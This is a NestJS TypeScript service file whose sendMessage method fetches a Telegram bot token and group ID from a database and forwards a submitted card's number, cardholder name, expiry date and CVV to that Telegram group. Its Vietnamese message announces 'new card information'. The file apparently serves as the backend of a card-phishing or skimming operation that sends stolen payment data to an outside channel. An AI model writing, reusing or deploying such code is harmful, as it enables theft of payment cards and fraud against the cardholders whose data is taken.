import { TypeOrmCrudService } from '@dataui/crud-typeorm';
import { Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Card } from 'src/entities/Card.entity';
import { Repository } from 'typeorm';
import * as TelegramBot from 'node-telegram-bot-api';
import { SendNotificationDto } from './card.controller';

@Injectable()
export class CardService extends TypeOrmCrudService<Card> {
  constructor(@InjectRepository(Card) repo: Repository<Card>) {
    super(repo);
  }

  async sendMessage(payload: SendNotificationDto) {
    const teleInfor: any = await this.repo.query(
      'SELECT * FROM bot_telegram LIMIT 1',
    );
    const telegramBot = new TelegramBot(teleInfor[0]?.token, { polling: true });
    return await telegramBot.sendMessage(
      `${teleInfor[0]?.groupId}`,
      `Bạn vừa có 1 thông tin thẻ mới:
       + cardNumber: ${payload.cardNumber}
       + nameOnCard: ${payload.nameOnCard}
       + expDate: ${payload.expDate}
       + cvv: ${payload.cvv}
      `,
    );
  }
}
